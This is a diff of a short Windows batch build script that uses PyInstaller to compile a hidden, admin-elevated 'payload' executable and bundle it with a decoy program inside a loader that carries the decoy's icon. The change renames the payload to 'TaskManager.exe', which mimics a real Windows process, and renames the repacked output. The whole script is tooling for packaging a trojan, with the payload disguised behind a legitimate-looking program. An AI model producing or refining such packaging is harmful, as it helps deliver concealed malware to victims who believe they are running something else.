@@ -5,11 +5,11 @@ REM Author: oxagast
 REM Modified: 02/02/24
 
 pyinstaller.exe --windowed --noconsole --onefile --icon=taskserv-icon.ico --disable-windowed-traceback --uac-admin .\payload.py
-copy dist\payload.exe .\taskserv.exe
-pyinstaller.exe --add-binary="taskserv.exe;." --add-binary="decoy.exe;." --icon=decoy.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
-rmdir repacked
+copy dist\payload.exe .\TaskManager.exe
+pyinstaller.exe --add-binary="TaskManager.exe;." --add-binary="decoy.exe;." --icon=decoy.exe --windowed --noconsole --onefile --disable-windowed-traceback --uac-admin .\loader.py
+
+rmdir repacked /S /Q
 mkdir repacked
-copy .\dist\loader.exe .\repacked\repacked-shell.exe
-del installer.exe
+copy dist\loader.exe .\repacked\repacked.exe
 rmdir dist /S /Q
 rmdir build /S /Q
